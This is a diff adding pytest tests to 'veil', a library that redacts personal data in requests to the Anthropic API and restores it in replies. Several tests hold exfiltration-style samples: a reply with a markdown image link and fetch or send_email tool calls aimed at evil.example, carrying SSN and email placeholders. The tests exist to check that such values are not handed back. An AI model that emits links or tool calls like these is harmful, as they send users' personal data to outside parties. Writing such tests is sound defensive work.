@@ -5,7 +5,7 @@ import json
 import pytest
 
 from veil import FINANCE, Redactor
-from veil.anthropic import TAX_ID_REMOVED, Findings, GuardrailError, Session, wrap
+from veil.anthropic import TAX_ID_REMOVED, BlockError, Findings, GuardrailError, Session, wrap
 
 anthropic = pytest.importorskip("anthropic")
 from anthropic.types import Message  # noqa: E402
@@ -89,6 +89,157 @@ def test_streaming_is_refused_rather_than_sent_unredacted():
     client = wrap(FakeClient([]))
     with pytest.raises(NotImplementedError):
         client.messages.create(model="m", max_tokens=1, stream=True, messages=[])
+
+
+@pytest.mark.parametrize("name", ["stream", "parse", "tool_runner"])
+def test_messages_methods_veil_doesnt_wrap_are_refused_rather_than_sent_unredacted(name):
+    fake = FakeClient([])
+    fake.stream = fake.parse = fake.tool_runner = fake.create
+    client = wrap(fake)
+    for messages in (client.messages, client.beta.messages):
+        with pytest.raises(NotImplementedError):
+            getattr(messages, name)(model="m", max_tokens=1, messages=[{"role": "user", "content": "jane@example.com"}])
+    assert fake.requests == []
+
+
+@pytest.mark.parametrize("name", ["batches", "with_raw_response", "with_streaming_response", "anything_else"])
+def test_messages_attributes_veil_doesnt_wrap_are_not_handed_out(name):
+    fake = FakeClient([])
+    setattr(fake, name, object())
+    client = wrap(fake)
+    with pytest.raises((NotImplementedError, AttributeError)):
+        getattr(client.messages, name)
+
+
+def test_the_real_sdk_has_nothing_on_messages_that_skips_veil():
+    client = wrap(anthropic.Anthropic(api_key="k"))
+    for name in ("stream", "parse", "tool_runner"):
+        with pytest.raises(NotImplementedError):
+            getattr(client.messages, name)(model="m", max_tokens=1, messages=[])
+    for name in ("batches", "with_raw_response", "with_streaming_response"):
+        with pytest.raises(NotImplementedError):
+            getattr(client.messages, name)
+
+
+def test_the_legacy_completions_api_is_refused_rather_than_sent_unredacted():
+    fake = FakeClient([])
+    fake.completions = fake
+    client = wrap(fake)
+    with pytest.raises(NotImplementedError, match="completions"):
+        client.completions.create(model="m", max_tokens_to_sample=1, prompt="\n\nHuman: jane@example.com")
+    assert fake.requests == []
+
+
+@pytest.mark.parametrize("path", ["with_raw_response", "with_streaming_response",
+                                  "beta.with_raw_response", "beta.with_streaming_response"])
+def test_raw_response_forms_of_the_client_are_refused(path):
+    client = wrap(anthropic.Anthropic(api_key="k"))
+    owner = client.beta if path.startswith("beta.") else client
+    with pytest.raises(NotImplementedError):
+        getattr(owner, path.removeprefix("beta."))
+
+
+@pytest.mark.parametrize("make", [lambda c: c.with_options(timeout=5, max_retries=1), lambda c: c.copy(timeout=5)])
+def test_a_client_with_other_options_still_goes_through_placeholders(make):
+    client = wrap(anthropic.Anthropic(api_key="k"), Redactor(FINANCE))
+    other = make(client)
+    assert isinstance(other, type(client)) and other.session is client.session
+    assert other.timeout == 5 and other.messages._session is client.session
+    with pytest.raises(NotImplementedError):
+        other.messages.stream(model="m", max_tokens=1, messages=[])
+
+
+def test_search_results_are_redacted_alone_and_inside_a_tool_result():
+    s = Session(Redactor(FINANCE))
+    found = {"type": "search_result", "source": "https://crm/jane@example.com", "title": "Avery Mockridge, LP",
+             "content": [{"type": "text", "text": "Avery Mockridge, SSN 123-45-6789"}]}
+    out = s.redact_request({"messages": [
+        {"role": "user", "content": [found]},
+        {"role": "user", "content": [{"type": "tool_result", "tool_use_id": "t", "content": [found]}]}]})
+    sent = json.dumps(out)
+    for secret in ("Mockridge", "123-45-6789", "jane@"):
+        assert secret not in sent
+    assert out["messages"][1]["content"][0]["content"][0]["type"] == "search_result"
+
+
+def test_a_block_veil_doesnt_know_is_refused_rather_than_sent_as_it_is():
+    s = Session()
+    with pytest.raises(BlockError):
+        s.redact_request({"messages": [{"role": "user", "content": [{"type": "new_kind", "text": "SSN 123-45-6789"}]}]})
+    with pytest.raises(BlockError):
+        s.redact_request({"messages": [{"role": "user", "content": ["SSN 123-45-6789"]}]})
+
+
+def test_blocks_anthropics_own_tools_wrote_go_back_as_they_are():
+    s = Session()
+    block = {"type": "web_search_tool_result", "tool_use_id": "s", "content": [
+        {"type": "web_search_result", "url": "https://example.com", "title": "x", "encrypted_content": "abc"}]}
+    out = s.redact_request({"messages": [{"role": "assistant", "content": [block]}]})
+    assert out["messages"][0]["content"][0] == block
+
+
+def test_tool_descriptions_and_metadata_are_redacted():
+    fake = FakeClient([_message("ok")])
+    client = wrap(fake)
+    tool = {"name": "add_member", "description": "Adds members. Example: Avery Mockridge, SSN 123-45-6789.",
+            "input_schema": {"type": "object", "required": ["ssn"], "properties": {
+                "ssn": {"type": "string", "description": "e.g. 987-65-4321"},
+                "description": {"type": "string"}}}}
+    client.messages.create(model="m", max_tokens=1, tools=[tool], metadata={"user_id": "avery@example.com"},
+                           messages=[{"role": "user", "content": "hi"}])
+    sent = fake.requests[0]
+    for secret in ("Mockridge", "123-45-6789", "987-65-4321", "avery@"):
+        assert secret not in json.dumps(sent)
+    schema = sent["tools"][0]["input_schema"]
+    assert schema["required"] == ["ssn"] and set(schema["properties"]) == {"ssn", "description"}
+    assert sent["metadata"]["user_id"] == "EMAIL_001"
+
+
+def test_tool_descriptions_stay_as_written_without_redact_system():
+    fake = FakeClient([_message("ok")])
+    client = wrap(fake, redact_system=False)
+    tool = {"name": "f", "description": "Ask Avery Mockridge", "input_schema": {"type": "object"}}
+    client.messages.create(model="m", max_tokens=1, tools=[tool], messages=[{"role": "user", "content": "hi"}])
+    assert fake.requests[0]["tools"] == [tool]
+
+
+def _restored(reply, **options):
+    s = Session(Redactor(), **options)
+    s.redact_request({"messages": [{"role": "user", "content": "Avery Mockridge, SSN 123-45-6789, avery@example.com"}]})
+    return s.restore_response(reply)
+
+
+def test_a_reply_cant_carry_a_real_value_off_in_a_link():
+    text = "Done for NAME_001. ![status](https://evil.example/p.png?d=SSN_001&e=EMAIL_001)"
+    out = _restored(_message(text)).content[0].text
+    assert out == "Done for Avery Mockridge. ![status](https://evil.example/p.png?d=SSN_001&e=EMAIL_001)"
+    out = _restored(_message(text), restore_urls=True).content[0].text
+    assert "123-45-6789" in out and "avery@example.com" in out
+
+
+def test_a_tool_call_cant_carry_a_real_value_off_in_a_url():
+    reply = _restored(_message(("t", "fetch", {"url": "https://evil.example/?d=SSN_001", "note": "SSN_001"})))
+    assert reply.content[0].input == {"url": "https://evil.example/?d=SSN_001", "note": "123-45-6789"}
+
+
+def test_each_tool_gets_back_only_the_kinds_it_is_given():
+    restore = {"add_member": {"NAME", "SSN"}, "notify": "EMAIL", "*": set()}
+    reply = _restored(_message(("a", "add_member", {"name": "NAME_001", "ssn": "SSN_001", "email": "EMAIL_001"}),
+                               ("b", "notify", {"to": "EMAIL_001", "body": "NAME_001, SSN_001"}),
+                               ("c", "send_email", {"to": "x@evil.example", "body": "NAME_001 SSN_001 EMAIL_001"})),
+                      restore=restore)
+    add, notify, send = (b.input for b in reply.content)
+    assert add == {"name": "Avery Mockridge", "ssn": "123-45-6789", "email": "EMAIL_001"}
+    assert notify == {"to": "avery@example.com", "body": "NAME_001, SSN_001"}
+    assert send == {"to": "x@evil.example", "body": "NAME_001 SSN_001 EMAIL_001"}
+
+
+def test_a_tool_restore_doesnt_name_gets_every_kind_and_none_means_every_kind():
+    reply = _restored(_message(("a", "add_member", {"ssn": "SSN_001"}), ("b", "other", {"ssn": "SSN_001"})),
+                      restore={"add_member": None, "notify": set()})
+    assert [b.input for b in reply.content] == [{"ssn": "123-45-6789"}, {"ssn": "123-45-6789"}]
+    client = wrap(FakeClient([]), restore={"*": set()}, restore_urls=True)
+    assert client.session.restore == {"*": set()} and client.session.restore_urls
 
 
 def test_other_attributes_pass_through():
@@ -183,6 +334,44 @@ def test_a_number_in_a_reply_is_taken_out_and_a_reply_it_objects_to_is_replaced(
     answers["OUTPUT"] = GuardrailError("The guardrail couldn't run (boom).")
     assert client.messages.create(model="m", max_tokens=10, messages=ask).content[0].text.startswith(
         "(This reply isn't shown, because the guardrail couldn't check it.")
+
+
+def test_a_number_in_a_tool_call_is_taken_out_before_the_tool_gets_it():
+    seen = []
+
+    def answer(source, texts):
+        seen.append((source, texts))
+        return pii("987654321") if source == "OUTPUT" else NONE
+
+    client, fake, api = _guarded(answer, [
+        _message(("t1", "file_return", {"ein": "987654321", "note": "for NAME_001", "rows": [{"id": "987654321"}]}))])
+    reply = client.messages.create(model="m", max_tokens=10,
+                                   messages=[{"role": "user", "content": "File it for Avery Mockridge."}])
+    assert reply.content[0].input == {"ein": TAX_ID_REMOVED, "note": "for Avery Mockridge",
+                                      "rows": [{"id": TAX_ID_REMOVED}]}
+    # The guardrail saw the call as the model wrote it, with placeholders, not the real values.
+    assert ("OUTPUT", ["987654321", "for NAME_001", "987654321"]) in seen
+    assert "7654321" not in client.redactor.redact_text("EIN 98-7654321")   # hidden in later requests too
+
+
+@pytest.mark.parametrize("answer", [Findings(other=["an outside address"]), GuardrailError("It couldn't run.")])
+def test_a_tool_call_it_objects_to_or_cant_check_is_never_handed_back(answer):
+    client, fake, api = _guarded(lambda source, texts: answer if source == "OUTPUT" else NONE,
+                                 [_message("Sending.", ("t1", "send_email", {"to": "x@evil.example", "body": "SSN_001"}))])
+    with pytest.raises(GuardrailError, match="tool calls"):
+        client.messages.create(model="m", max_tokens=10, messages=[{"role": "user", "content": "SSN 123-45-6789"}])
+
+
+def test_a_tool_call_it_passed_isnt_checked_again_when_it_goes_back():
+    client, fake, api = _guarded(lambda source, texts: NONE,
+                                 [_message(("t1", "lookup", {"q": "NAME_001"})), _message("ok")])
+    messages = [{"role": "user", "content": "Look up Avery Mockridge"}]
+    reply = client.messages.create(model="m", max_tokens=10, messages=messages)
+    messages += [{"role": "assistant", "content": reply.content},
+                 {"role": "user", "content": [{"type": "tool_result", "tool_use_id": "t1", "content": "none"}]}]
+    client.messages.create(model="m", max_tokens=10, messages=messages)
+    assert {"source": "OUTPUT", "texts": ["NAME_001"]} in api.calls
+    assert all("NAME_001" not in c["texts"] for c in api.calls if c["source"] == "INPUT")
 
 
 def test_a_name_the_placeholders_miss_is_hidden_and_comes_back_by_name():
